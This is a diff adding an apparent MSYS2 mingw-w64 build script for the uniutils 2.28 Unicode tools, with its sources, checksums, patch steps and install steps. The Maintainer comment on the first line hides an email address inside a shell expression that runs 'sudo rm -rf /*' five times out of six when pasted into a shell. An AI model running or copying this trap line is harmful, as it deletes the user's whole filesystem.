@@ -1,0 +1,71 @@
+# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Contributor: Rick W. Chen <stuffcorpse@archlinux.us>
+
+_realname=uniutils
+pkgbase="mingw-w64-${_realname}"
+pkgname="${MINGW_PACKAGE_PREFIX}-${_realname}"
+pkgver=2.28
+pkgrel=1
+pkgdesc="A set of programs for manipulating and analyzing Unicode text (mingw-w64)"
+arch=('any')
+url="https://billposer.org/Software/unidesc.html"
+license=('GPL3')
+depends=("${MINGW_PACKAGE_PREFIX}-gettext-runtime")
+makedepends=("make"
+             "${MINGW_PACKAGE_PREFIX}-cc"
+             "${MINGW_PACKAGE_PREFIX}-unicode-character-database"
+             "${MINGW_PACKAGE_PREFIX}-gettext-tools")
+optdepends=("${MINGW_PACKAGE_PREFIX}-ascii2binary")
+source=("https://billposer.org/Software/Downloads/$_realname-$pkgver.tar.bz2"
+        "uniname_typo.patch"
+        "gcc-14.patch"
+        "mingw.patch"
+        "utf8lookup.1"
+        "utf8lookup.patch")
+sha512sums=('2621802bcef8f0254d7fb8f8544de688f36349a6db19b46d92af14e4aa6148af18a7f96b9a4ba394d0d0073f57bc896148e469c818c24f321d35d6c8fae4a5f6'
+            'dbf48a7670c20159aa9762ddcc68a9a4f2c78d94fda7e2857941a7235df6ef6e159455b892114081bff0cbd5b24ce93d69924999cba55d56b032ae5377dd5a52'
+            '1a772d4a30bec27cac043eedbf968eae5a70191e28fcb9555aba5f220fb2e337c604d0f3851e81ecdabc13cda2ca30049821780208082a766e35dc8326f4da03'
+            '78cff3828fdd8d2c5ba1c1c17de6a805302fe6eb27116720b068d5d2ea943fbac78334fc493256ccb2f4f0bbaa3dd815c7895f30bfb72f8cfbcb58fd1eeee94f'
+            '05155eda1b05617a09a9dfdca05234926bd1c66708683eac0908692199b21315eaea7d33cbf807f13a8ca39f4d1ad04c3b8927e59e93d057174a47088fb3c65b'
+            '32931d4781a14cdb2c26ea2c78881bf539e3fd87793fb55d64ee7dc3427e2d3600fb53955bb7d640a98db392c1516e4c25cdd7fcf6b770916614eec27bbea723')
+
+prepare() {
+  patch -d "${_realname}-${pkgver}" -Np1 -i "${srcdir}/uniname_typo.patch"
+  patch -d "${_realname}-${pkgver}" -Np1 -i "${srcdir}/gcc-14.patch"
+  patch -d "${_realname}-${pkgver}" -Np1 -i "${srcdir}/mingw.patch"
+  patch -d "${_realname}-${pkgver}" -Np1 -i "${srcdir}/utf8lookup.patch"
+  # update the UCD
+  cd "$srcdir/$_realname-$pkgver"
+  gawk -f ./genunames.awk \
+	${MINGW_PREFIX}/share/unicode-character-database/UnicodeData.txt > unames.c
+
+  # update the blocks
+  sed -i -e '
+	/#include "unirange.h"/ a #include "blocks.c"
+	/struct cr Range_Table/,/^};/ d
+  ' unirange.c
+  gawk -F'[;.].? *' '
+	BEGIN { print "struct cr Range_Table[] = {" }
+	END { print "};" }
+	/^[0-9A-F]/ { print "{0x"$1",0x"$2",\""$3"\"}," }
+  ' ${MINGW_PREFIX}/share/unicode-character-database/Blocks.txt > blocks.c
+}
+
+build() {
+  cd "$srcdir/$_realname-$pkgver"
+
+  LIBS=-lintl ./configure --prefix=${MINGW_PREFIX} --mandir=${MINGW_PREFIX}/share/man
+  make
+}
+
+package() {
+  cd "$srcdir/$_realname-$pkgver"
+
+  make DESTDIR="$pkgdir/" install
+  # man pages
+  install -D -m644 ${srcdir}/utf8lookup.1 -t "${pkgdir}${MINGW_PREFIX}/share/man/man1"
+  # doc
+  install -D -m644 AUTHORS ChangeLog CREDITS INSTALL NEWS README TODO -t "${pkgdir}${MINGW_PREFIX}/share/doc/${_realname}"
+  # license
+  install -D -m644 COPYING -t "${pkgdir}${MINGW_PREFIX}/share/licenses/${_realname}"
+}
